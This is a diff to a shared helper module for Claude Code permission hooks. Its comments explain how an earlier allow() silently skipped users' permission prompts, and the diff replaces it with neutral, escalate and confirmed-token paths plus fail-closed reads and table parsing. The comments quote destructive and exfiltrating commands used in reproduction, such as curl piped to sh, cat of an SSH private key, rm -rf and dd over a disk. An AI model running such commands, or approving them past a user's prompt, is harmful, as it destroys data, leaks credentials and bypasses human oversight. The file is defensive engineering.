@@ -32,10 +32,85 @@ import process from 'node:process';
 // which this function never wrote to. Claude saw an empty error message
 // instead of the remediation text. Fixed 2026-07-12 (Claude-Topics compliance
 // sweep, Round 1).
-export function allow() {
+// 2026-08-13, finding X1 (CRITICAL, reproduced by execution — see
+// test/repro/X1-auto-approval.mjs). This used to be a single `allow()` that
+// emitted `permissionDecision: "allow"` on EVERY path where the hook had no
+// objection. Per the official PreToolUse decision contract
+// (https://code.claude.com/docs/en/hooks, "PreToolUse Decision Control"):
+//
+//   | "allow"    | Permit the tool call to proceed without a permission prompt |
+//   | "deny"     | Block the tool call ...                                     |
+//   | "escalate" | Show the permission prompt to the user, even in auto mode    |
+//
+//   "A hook that doesn't return JSON, or returns JSON without a
+//    permissionDecision, doesn't affect the permission flow; the call continues
+//    through normal permission evaluation."
+//
+// So "no objection" was being expressed as "approve this and skip the user's
+// prompt". Reproduced live: `rm -rf /important`, `curl http://…/x.sh | sh`,
+// `cat ~/.ssh/id_rsa`, `chmod -R 777 /` and `dd if=/dev/zero of=/dev/sda` all
+// returned "allow" — i.e. installing a SAFETY plugin silently switched off the
+// user's permission prompts for every non-push command. That is OWASP
+// LLM06:2025 Excessive Agency: the component held far more authority than its
+// job needs. These hooks have a legitimate basis to DENY a push; they have none
+// to APPROVE arbitrary commands.
+//
+// The single function is now deliberately split in two, so that every emission
+// of "allow" is an explicit, greppable, reasoned decision rather than a default:
+//
+//   stepAside()  — the neutral no-decision exit. Used on every path meaning
+//                  "not my business": not push-capable, not a studio project,
+//                  or (for scan.mjs) no secrets found. scan.mjs is veto-only and
+//                  must NEVER authorise anything.
+//   authorise()  — emits "allow". Legitimate ONLY where the user has explicitly
+//                  confirmed this exact action moments ago and a project-bound,
+//                  expiring token proves it. Only gate.mjs's two confirmed-token
+//                  paths may call it.
+//
+// There is deliberately no "defer" value here: a peer review recommended one,
+// but no such value exists in the contract above. Emitting nothing IS the
+// documented neutral, so stepAside() writes no stdout at all.
+//
+// `repo-integrity.mjs` enforces the split mechanically (invariant INV17), so a
+// future edit cannot quietly reintroduce a blanket approval.
+export function stepAside() {
+  process.exit(0);
+}
+
+// 2026-08-13, independent-review finding F4. `permissionDecision: "allow"` applies
+// to the WHOLE command string, so a valid publish token blanket-approved anything
+// bolted onto the push — reproduced live:
+//   `git push origin main && rm -rf $HOME/important-data`  -> allow
+//   `git push origin main; curl http://…/x.sh | sh`        -> allow
+// That is precisely the hazard X1 was raised against, and it contradicts
+// authorise()'s own contract: legitimate only where the user confirmed THIS EXACT
+// action. Rather than deny such commands outright — which would break ordinary
+// `git add … && git commit … && git push …` flows — the gate now ESCALATES them.
+// Per the documented contract, "escalate" shows the permission prompt to the user
+// even in auto mode: the token still proves intent, but the extra segments get a
+// human's eyes instead of a silent approval. This is the same
+// "escalate rather than guess" principle chosen for the wider architecture.
+export function escalate(reason) {
   process.stdout.write(
     JSON.stringify({
-      hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'allow' },
+      hookSpecificOutput: {
+        hookEventName: 'PreToolUse',
+        permissionDecision: 'escalate',
+        permissionDecisionReason: String(reason),
+      },
+    }) + '\n',
+  );
+  process.exit(0);
+}
+
+export function authorise(reason) {
+  process.stdout.write(
+    JSON.stringify({
+      hookSpecificOutput: {
+        hookEventName: 'PreToolUse',
+        permissionDecision: 'allow',
+        permissionDecisionReason: String(reason),
+      },
     }) + '\n',
   );
   process.exit(0);
@@ -417,8 +492,36 @@ export function tokenConfirmedWithinTtl(text, expected) {
 //     counts alone. Combined with scoping CONTRADICTION_RE to the evidence/
 //     verification CELL (not the whole row) in quality-gate.mjs and
 //     traceability-check.mjs, a label word can never trip the gate again.
+// 2026-08-13, finding X11b (defence in depth). `unverified` was not among the
+// contradiction terms, even though `not verified` and `hasn't been verified`
+// were. verify-progress.mjs's own VERIFIED_RE now carries a lookbehind that stops
+// `unverified:` matching `verified:`, which closes the reproduced case; this adds
+// a second line of defence so a row carrying BOTH a valid `verified:` clause and
+// an "unverified" admission elsewhere still blocks.
+//
+// Narrowed the same day, after a false positive caught by running the gate
+// against this repository's own memory. A bare `\bunverified\b` blocked a
+// legitimately green row whose note read "confirming the researcher's unverified
+// inference" — prose about a THIRD PARTY's claim, not a statement that this task
+// is unverified. So the term only counts when it is actually making a claim about
+// verification state: as an evidence prefix (`unverified:` — the reproduced bug
+// shape), or after is/are/remains/still/currently. This is the same
+// over-broad-pattern mistake this file has had to correct before, in the
+// `regress(?:ed|ion)` and "Regression tests" cases below and above.
+// 2026-08-13, independent-review findings F7 and F8 (both reproduced). Two
+// defects in the alternatives added earlier the same day:
+//
+// F7: `unverified[ \t]*:` sat inside the enclosing `\b( … )\b`. A trailing `\b`
+// after a colon requires a WORD character immediately next, which real evidence
+// never has — so `unverified: pending` did not match and the alternative was dead
+// for its own primary target. Rewritten as `unverified(?=[ \t]*:)`, a lookahead,
+// so the word boundary lands on the word itself.
+//
+// F8: the check was spelling-specific. `un-verified:` and `not-verified:` both
+// satisfied verify-progress.mjs's letter-only lookbehind AND had no alternative
+// here, so a hyphenated spelling passed both halves. Added explicitly.
 export const CONTRADICTION_RE =
-  /(?<!\b(?:not|never|no)[ \t]+)\b(exit(?:ed)?(?:[ \t]+with)?[ \t]+code[ \t]*:?[ \t]*[1-9]\d*|exit[ \t]+[1-9]\d*|now[ \t]+fails?|currently[ \t]+(broken|failing)|current(?:ly)?[ \t]+(?:[^,;|()]{0,40}?[ \t]+)?(?<!\b(?:not|never|no)[ \t]+)fails?|has(?:n'?t| not)[ \t]+(?:yet[ \t]+)?been[ \t]+(?:re-?)?verified|not[ \t]+(?:yet[ \t]+)?verified|still[ \t]+fail(?:s|ing)?|regress(?:ed|ion(?=[ \t]+(?:(?:was|is|are|were|has|had|have|got|been)[ \t]+)*(?:spotted|found|seen|detected|introduced|observed|occurred|appeared|reported|caught))))\b/i;
+  /(?<!\b(?:not|never|no)[ \t]+)\b(unverified(?=[ \t]*:)|(?:un|non|not)-verified|(?:is|are|remains?|still|currently)[ \t]+unverified|exit(?:ed)?(?:[ \t]+with)?[ \t]+code[ \t]*:?[ \t]*[1-9]\d*|exit[ \t]+[1-9]\d*|now[ \t]+fails?|currently[ \t]+(broken|failing)|current(?:ly)?[ \t]+(?:[^,;|()]{0,40}?[ \t]+)?(?<!\b(?:not|never|no)[ \t]+)fails?|has(?:n'?t| not)[ \t]+(?:yet[ \t]+)?been[ \t]+(?:re-?)?verified|not[ \t]+(?:yet[ \t]+)?verified|still[ \t]+fail(?:s|ing)?|regress(?:ed|ion(?=[ \t]+(?:(?:was|is|are|were|has|had|have|got|been)[ \t]+)*(?:spotted|found|seen|detected|introduced|observed|occurred|appeared|reported|caught))))\b/i;
 
 // ---- shared markdown-table patterns (fixes a six-way drift) ------------------
 // 2026-07-29 maintenance fix (audit finding 4). SEPARATOR_ROW_RE (the `| :-- |
@@ -600,6 +703,119 @@ export function frontmatterBlock(text) {
 // Status/Where column and skipped the row entirely — a false-clean in
 // verify-progress and memory-integrity. Shared so every table-parsing hook splits
 // identically. Leading/trailing empty cells are preserved, exactly like split('|').
+// ---- shared fail-closed read (2026-08-13, finding X12) -----------------------
+// Five separate gates had the same defect: a single `read()` returning null for
+// BOTH "the file isn't there" and "the file is there but I couldn't read it",
+// with the caller treating null as "nothing to check" and exiting 0. So an
+// unreadable INDEX.md, a directory where REQUIREMENTS.md should be, or a
+// half-written file on a full disk silently passed the very gate meant to
+// guarantee it. Reproduced by execution on memory-integrity.mjs (twice) and
+// traceability-check.mjs — see test/repro/phase1-gate-honesty.mjs cases P6-P8.
+//
+// content-check.mjs already had the correct shape and documented the principle:
+// "A gate that cannot read its input must never claim its input is fine." Rather
+// than fix the same bug five times and invite a sixth, that shape is promoted
+// here and every gate uses it.
+//
+// ENOENT is genuine absence and returns the MISSING sentinel, which a caller may
+// legitimately treat as "not applicable". Every other error throws, and each
+// gate's own handler turns that into a BLOCKING, explained problem.
+export const MISSING = Symbol('missing');
+export function readOrBlock(p) {
+  try {
+    return stripBom(fs.readFileSync(p, 'utf8'));
+  } catch (e) {
+    if (e && e.code === 'ENOENT') return MISSING;
+    throw e; // never swallowed: an unreadable input is a block, not a pass
+  }
+}
+
+// ---- shared markdown table parser (2026-08-13, findings X2, X10) -------------
+// Four gates each had their own table reader, gated on `/^\s*\|/`, and each read
+// only the FIRST table it found. Two consequences, both reproduced:
+//
+//   * quality-gate.mjs and content-check.mjs ignored every later table. A project
+//     that appends its current phase's Definition of Done below the finished one
+//     — which its own append-never-rewrite discipline encourages — got a green
+//     light while the live table said its tests were failing. That is the worst
+//     class of defect here, because nobody re-checks a passing gate.
+//   * a pipe-less GFM table (outer pipes omitted, valid markdown that renders
+//     identically on GitHub) was not seen at all, so four gates reported "no
+//     table found" about a file that plainly had one.
+//
+// verify-progress.mjs already had the strongest reader — it handles pipe-less
+// tables and fails closed on a row whose column count disagrees with its header,
+// which is what catches a raw pipe inside a cell shifting every later column.
+// That reader is promoted here verbatim in behaviour, and returns EVERY table.
+//
+// 2026-08-13, independent-review finding F12 — scope corrected. Two gates use this
+// helper today: quality-gate.mjs and content-check.mjs. verify-progress.mjs still
+// carries the original it was promoted FROM, because its reader also computes a
+// status-column index and tracks which lines a table consumed; migrating it is a
+// separate, riskier change than this one, and doing it badly would put the sole
+// mechanical enforcer of "done means proven" at risk. memory-integrity.mjs and
+// traceability-check.mjs still require a leading pipe, so a pipe-less table is
+// unreadable to them — they fail CLOSED on it, so it is a false block rather than a
+// false pass, but it is not fixed. Both are recorded as follow-on work rather than
+// claimed as done here.
+//
+// Returns: [{ headerCells, rows: [{ raw, cells, ragged }] }]
+//   ragged === true means the row's column count disagrees with the header, so
+//   its cells cannot be trusted positionally. A caller must fail closed on a
+//   ragged row that makes any claim, never skip it silently.
+export function parseTables(text) {
+  const lines = String(text).split(/\r?\n/);
+  const normCells = (line) => {
+    const cells = splitPipeCells(line).map((c) => c.trim());
+    const t = line.trim();
+    if (t.startsWith('|')) cells.shift();
+    if (t.endsWith('|') && cells.length) cells.pop();
+    return cells;
+  };
+  const hasPipe = (l) => l.trim() !== '' && l.includes('|');
+  const tables = [];
+  for (let i = 0; i < lines.length; i++) {
+    const header = lines[i];
+    const next = i + 1 < lines.length ? lines[i + 1] : '';
+    const isHeader =
+      header.trim() !== '' &&
+      header.includes('|') &&
+      !SEPARATOR_ROW_RE.test(header) &&
+      (SEPARATOR_ROW_RE.test(next) || /^\s*\|/.test(header));
+    if (!isHeader) continue;
+    const headerCells = normCells(header);
+    // 2026-08-13, independent-review finding F6 (reproduced). A table's rows must
+    // be recognised in the SAME style as its header. The first version of this
+    // helper ended a table only at a blank or pipe-less line, which was safe in
+    // verify-progress.mjs (where a ragged row mattered only if it claimed "done")
+    // but not in quality-gate.mjs or content-check.mjs, where a ragged row is now
+    // a hard block. Consequence: an ordinary prose line immediately after a piped
+    // table — "Notes: filtered with `grep -v warn | head -20`." — was read as a
+    // malformed ROW and blocked the gate, with advice ("write it as \|") that was
+    // simply wrong, because the line was never a table row at all.
+    //
+    // A piped table therefore only continues through lines that are themselves
+    // piped; a pipe-less table keeps the looser rule, because that is the only
+    // thing that identifies its rows.
+    const pipeLed = /^\s*\|/.test(header);
+    const looksLikeRow = (l) => (pipeLed ? /^\s*\|/.test(l) : hasPipe(l));
+    const rows = [];
+    let j = i + 1;
+    for (; j < lines.length; j++) {
+      const row = lines[j];
+      if (!looksLikeRow(row)) break; // this line is not part of THIS table
+      if (SEPARATOR_ROW_RE.test(row)) continue; // the `| :-- | :-- |` divider
+      const cells = normCells(row);
+      rows.push({ raw: row, cells, ragged: cells.length !== headerCells.length });
+    }
+    // headerLine lets a caller inspect the lines ABOVE a table — needed for
+    // quality-gate.mjs's explicit opt-out marker (finding F1).
+    tables.push({ headerCells, rows, headerLine: i });
+    i = j - 1; // resume after this table, so its rows are not re-read as headers
+  }
+  return tables;
+}
+
 export function splitPipeCells(line) {
   return line.split(/(?<!\\)\|/).map((cell) => cell.replace(/\\\|/g, '|'));
 }
